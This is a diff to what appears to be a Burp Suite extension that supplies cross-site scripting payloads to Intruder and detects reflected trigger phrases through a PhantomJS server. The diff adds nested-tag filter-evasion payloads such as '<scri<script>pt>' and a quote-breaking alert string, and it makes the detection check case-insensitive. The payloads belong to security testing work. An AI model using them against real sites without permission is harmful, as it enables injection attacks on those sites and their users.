@@ -46,7 +46,11 @@ public class BurpExtender implements IBurpExtender, IHttpListener, IIntruderPayl
 		("\"><script>alert('" + triggerPhrase + "')</script>").getBytes(),
 		("'><script>alert('" + triggerPhrase + "')</script>").getBytes(),
 		("<SCRIPT>alert('" + triggerPhrase + "');</SCRIPT>").getBytes(),
+		("<scri<script>pt>alert('" + triggerPhrase + "');</scr</script>ipt>").getBytes(),
+		("<SCRI<script>PT>alert('" + triggerPhrase + "');</SCR</script>IPT>").getBytes(),
+		("<scri<scr<script>ipt>pt>alert('" + triggerPhrase + "');</scr</sc</script>ript>ipt>").getBytes(),
 		("'';!--\"<" + triggerPhrase + ">=&{()}").getBytes(),
+		("\";alert('" + triggerPhrase + "');\"").getBytes(),
 		("<IMG SRC=\"javascript:alert('" + triggerPhrase + "');\">").getBytes(),
 		("<IMG SRC=javascript:alert('" + triggerPhrase + "')>").getBytes(),
 		("<IMG SRC=JaVaScRiPt:alert('" + triggerPhrase + "')>").getBytes(),
@@ -151,7 +155,6 @@ public class BurpExtender implements IBurpExtender, IHttpListener, IIntruderPayl
         if (toolFlag == 32 && messageIsRequest) {
         	// Manipulate intruder request, if necessary
         } else if (toolFlag == 32 && ! messageIsRequest) {
-        	stdout.println("Response Received");
         	HttpPost PhantomJs = new HttpPost(phantomServer);
         	
         	try {
@@ -170,7 +173,7 @@ public class BurpExtender implements IBurpExtender, IHttpListener, IIntruderPayl
             	
 	            // parse response for XSS by checking whether it contains 
             	// the trigger phrase
-	            if(responseAsString.contains(triggerPhrase)) {
+	            if(responseAsString.toLowerCase().contains(triggerPhrase.toLowerCase())) {
 	            	// Append weird string to identify XSS
 		            String newResponse = helpers.bytesToString(messageInfo.getResponse()) + "fy7sdufsuidfhuisdf";
 	            	messageInfo.setResponse(helpers.stringToBytes(newResponse));
